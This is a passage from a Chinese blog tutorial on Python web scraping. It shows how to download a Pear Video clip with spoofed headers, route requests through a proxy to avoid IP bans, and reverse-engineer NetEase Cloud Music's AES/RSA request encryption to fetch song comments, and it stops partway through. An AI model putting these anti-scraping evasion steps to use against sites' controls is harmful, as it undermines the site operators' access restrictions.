requests.get(videoStatusUrl)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074126.jpg"                      alt="image-20220912215828255"                ></p><p>​    问题出在哪呢？加个UA和Referer吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、拿到contId</span></span><br><span class="line"><span class="comment"># 2、拿到videoStatus返回的json. -&gt; srcURL</span></span><br><span class="line"><span class="comment"># 3、srcURL里面的内容进行修整</span></span><br><span class="line"><span class="comment"># 4、下载视频</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.pearvideo.com/video_1168452&quot;</span></span><br><span class="line">contId = url.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">videoStatusUrl = <span class="string">f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=<span class="subst">&#123;contId&#125;</span>&amp;mrd=0.38022964971760365&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://www.pearvideo.com/video_1168452&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(videoStatusUrl, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074128.jpg"                      alt="image-20220912220254577"                ></p><p>​    处理一下格式吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、拿到contId</span></span><br><span class="line"><span class="comment"># 2、拿到videoStatus返回的json. -&gt; srcURL</span></span><br><span class="line"><span class="comment"># 3、srcURL里面的内容进行修整</span></span><br><span class="line"><span class="comment"># 4、下载视频</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.pearvideo.com/video_1168452&quot;</span></span><br><span class="line">contId = url.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">videoStatusUrl = <span class="string">f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=<span class="subst">&#123;contId&#125;</span>&amp;mrd=0.38022964971760365&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: url</span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(videoStatusUrl, headers=headers)</span><br><span class="line">dic = resp.json()</span><br><span class="line">srcUrl = dic[<span class="string">&#x27;videoInfo&#x27;</span>][<span class="string">&#x27;videos&#x27;</span>][<span class="string">&#x27;srcUrl&#x27;</span>]</span><br><span class="line">systemTime = dic[<span class="string">&#x27;systemTime&#x27;</span>]</span><br><span class="line">srcUrl = srcUrl.replace(systemTime, <span class="string">f&quot;cont-<span class="subst">&#123;contId&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(srcUrl)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074129.jpg"                      alt="image-20220912221041287"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、拿到contId</span></span><br><span class="line"><span class="comment"># 2、拿到videoStatus返回的json. -&gt; srcURL</span></span><br><span class="line"><span class="comment"># 3、srcURL里面的内容进行修整</span></span><br><span class="line"><span class="comment"># 4、下载视频</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.pearvideo.com/video_1168452&quot;</span></span><br><span class="line">contId = url.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">videoStatusUrl = <span class="string">f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=<span class="subst">&#123;contId&#125;</span>&amp;mrd=0.38022964971760365&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: url</span><br><span class="line">&#125;</span><br><span class="line">resp = requests.get(videoStatusUrl, headers=headers)</span><br><span class="line">dic = resp.json()</span><br><span class="line">srcUrl = dic[<span class="string">&#x27;videoInfo&#x27;</span>][<span class="string">&#x27;videos&#x27;</span>][<span class="string">&#x27;srcUrl&#x27;</span>]</span><br><span class="line">systemTime = dic[<span class="string">&#x27;systemTime&#x27;</span>]</span><br><span class="line">srcUrl = srcUrl.replace(systemTime, <span class="string">f&quot;cont-<span class="subst">&#123;contId&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载视频</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.mp4&quot;</span>,mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(requests.get(srcUrl).content)</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74130.jpg"                      alt="image-20220912221433767"                ></p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>​    当我们反复抓取⼀个⽹站时, 由于请求过于频繁, 服务器很可能会将 你的IP进⾏封锁来反爬. 应对⽅案就是通过⽹络代理的形式进⾏伪装。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074132.jpg"                      alt="image-20220913202226934"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:  <span class="string">&quot;http://23.26.236.11:3128&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>, proxies=proxies)</span><br><span class="line">resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><h4 id="网易云音乐评论信息"><a href="#网易云音乐评论信息" class="headerlink" title="网易云音乐评论信息"></a>网易云音乐评论信息</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74133.jpg"                      alt="image-20220913204957315"                ></p><p>​    想抓王心凌的评论🥵，怎么办呢。先看看网页源代码，不出所料没在源码里</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074133.jpg"                      alt="image-20220913205128679"                ></p><p>​    再看看框架源代码，也没有。框架源代码是什么呢，有的网页里。他会在一个html里嵌套另一个html，所以就有两套源代码</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074135.jpg"                      alt="image-20220913205347166"                ></p><p>​    抓个包看看，找到了评论🥵</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074137.jpg"                      alt="image-20220913205733981"                ></p><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074138.jpg"                      alt="image-20220913210620600"                ></p><p>​    加密了，寄。放弃</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074139.jpg"                      alt="image-20220913211159574"                ></p><p>​    这个地方是请求调用堆栈的过程，从下往上依次调用，也就是加载js脚本的过程。我们找到第一个，下个断点。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74142.jpg"                      alt="image-20220914005320553"                ></p><p>​    发现url处不是我们想要的url，我们放过他，一直往后找，放了八九个包，找到啦。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074143.jpg"                      alt="image-20220914010056161"                ></p><p>​    发现在e2x参数时已经被加密啦，我们现在往回找</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074145.jpg"                      alt="image-20220914010307648"                ></p><p>​    查看调用堆栈，这里的东西和前面启动器里的是一样的，一个一个向上找，点开查看参数就行</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74146.jpg"                      alt="image-20220914011501764"                ></p><p>​    由上图，程序一定在t2x.be3x被加密，所以我们回看这个js</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074147.jpg"                      alt="image-20220914012123369"                ></p><p>​    先把断点打在此处，然后重新刷新，我们可以看到此时还没有被加密</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074150.jpg"                      alt="image-20220914233434862"                ></p><p>​    找到加密方法，我们可以一行一行下断点走下来，这里我不下了，直接下在加密处</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74152.jpg"                      alt="image-20220914012839026"                ></p><p>​    然后F10</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074153.jpg"                      alt="image-20220914013502516"                ></p><p>​    这一段的逻辑如下所示</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074154.jpg"                      alt="image-20220914014202263"                ></p><p>​    可以看到i2x为原始数据，先写成这样吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br></pre></td></tr></table></figure><p>​    下面处理加密过程，直接搜加密函数，就俩，那实际执行的就是d</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074155.jpg"                      alt="image-20220915000416491"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74157.jpg"                      alt="image-20220915000538520"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d, e, b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>, c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (d = <span class="number">0</span>; a &gt; d; d += <span class="number">1</span>)</span><br><span class="line">            e = <span class="title class_">Math</span>.<span class="title function_">random</span>() * b.<span class="property">length</span>,</span><br><span class="line">            e = <span class="title class_">Math</span>.<span class="title function_">floor</span>(e),</span><br><span class="line">            c += b.<span class="title function_">charAt</span>(e);</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(b)</span><br><span class="line">          , d = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&quot;0102030405060708&quot;</span>)</span><br><span class="line">          , e = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(a)</span><br><span class="line">          , f = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(e, c, &#123;</span><br><span class="line">            <span class="attr">iv</span>: d,</span><br><span class="line">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_">toString</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d, e;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">setMaxDigits</span>(<span class="number">131</span>),</span><br><span class="line">        d = <span class="keyword">new</span> <span class="title class_">RSAKeyPair</span>(b,<span class="string">&quot;&quot;</span>,c),</span><br><span class="line">        e = <span class="title function_">encryptedString</span>(d, a)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">d, e, f, g</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = &#123;&#125;</span><br><span class="line">          , i = <span class="title function_">a</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> h.<span class="property">encText</span> = <span class="title function_">b</span>(d, g),</span><br><span class="line">        h.<span class="property">encText</span> = <span class="title function_">b</span>(h.<span class="property">encText</span>, i),</span><br><span class="line">        h.<span class="property">encSecKey</span> = <span class="title function_">c</span>(i, e, f),</span><br><span class="line">        h</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">a, b, d, e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> f = &#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> f.<span class="property">encText</span> = <span class="title function_">c</span>(a + e, b, d),</span><br><span class="line">        f</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​    入口是d，我们现在去看一下上面调用过程</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bKB4F = <span class="variable language_">window</span>.<span class="title function_">asrsea</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i2x), <span class="title function_">buV2x</span>([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), <span class="title function_">buV2x</span>(<span class="title class_">Rg7Z</span>.<span class="property">md</span>), <span class="title function_">buV2x</span>([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br></pre></td></tr></table></figure><p>​    d参数就是我们的原数据，上面已经给出</p><p>​    e参数是（buV2x([“流泪”, “强”])）这个函数运行的结果，我们别管到底是什么了，直接跑一下，’010001’</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074158.jpg"                      alt="image-20220915003323528"                ></p><p>​    f和e类似，跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074200.jpg"                      alt="image-20220915003533490"                ></p><p>​    g一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;0CoJUm6Qyw8W8jud&#x27;</span><br></pre></td></tr></table></figure><p>​    分析一下js,可以发现我们就得把i定死，具体看下面代码注释里的分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)</span></span><br><span class="line"><span class="comment"># 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey</span></span><br><span class="line"><span class="comment"># 3.请求到网易，拿到评论信息</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方式是post,拿真实参数</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageNo&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span>,</span><br><span class="line">    <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1474411443&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot;</span> \</span><br><span class="line">    <span class="string">&quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot;</span> \</span><br><span class="line">    <span class="string">&quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot;</span> \</span><br><span class="line">    <span class="string">&quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;</span></span><br><span class="line">g = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">e = <span class="string">&quot;010001&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理加密过程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function a(a = 16) &#123;</span></span><br><span class="line"><span class="string">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span></span><br><span class="line"><span class="string">        for (d = 0; a &gt; d; d += 1) # 循环16次</span></span><br><span class="line"><span class="string">            e = Math.random() * b.length, # 随机数，假如是 1.2345</span></span><br><span class="line"><span class="string">            e = Math.floor(e), # 取整 ，假设下会变为 1</span></span><br><span class="line"><span class="string">            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b</span></span><br><span class="line"><span class="string">        return c #产生随机的16位字符串</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function b(a, b) &#123;</span></span><br><span class="line"><span class="string">        var c = CryptoJS.enc.Utf8.parse(b)</span></span><br><span class="line"><span class="string">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span></span><br><span class="line"><span class="string">          , e = CryptoJS.enc.Utf8.parse(a)</span></span><br><span class="line"><span class="string">          , f = CryptoJS.AES.encrypt(e, c, &#123;</span></span><br><span class="line"><span class="string">            iv: d,</span></span><br><span class="line"><span class="string">            mode: CryptoJS.mode.CBC</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        return f.toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function c(a, b, c) &#123;</span></span><br><span class="line"><span class="string">        var d, e;</span></span><br><span class="line"><span class="string">        return setMaxDigits(131),</span></span><br><span class="line"><span class="string">        d = new RSAKeyPair(b,&quot;&quot;,c),</span></span><br><span class="line"><span class="string">        e = encryptedString(d, a)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">d:数据</span></span><br><span class="line"><span class="string">e:010001</span></span><br><span class="line"><span class="string">f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line"><span class="string">g:&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line"><span class="string">    function d(d, e, f, g) &#123;</span></span><br><span class="line"><span class="string">        var h = &#123;&#125; #h现在是空对象</span></span><br><span class="line"><span class="string">          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值</span></span><br><span class="line"><span class="string">        h.encText = b(d, g),</span></span><br><span class="line"><span class="string">        h.encText = b(h.encText, i), </span></span><br><span class="line"><span class="string">        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了</span></span><br><span class="line"><span class="string">        return h</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    function e(a, b, d, e) &#123;</span></span><br><span class="line"><span class="string">        var f = &#123;&#125;;</span></span><br><span class="line"><span class="string">        return f.encText = c(a + e, b, d),</span></span><br><span class="line"><span class="string">        f</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    我们现在在d函数上设置一个断点，asrsea的断点也在。可以发现我们的分析没有错</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74203.jpg"                      alt="image-20220915010148829"                ></p><p>​    把i定为：jVQn8x1vCuwKtrdO，我们在asrsea函数下面一行再设置一个断点，这样就可以观察出来加密的数值了</p><p><img                       lazyload                     src="/images/loading.svg"                     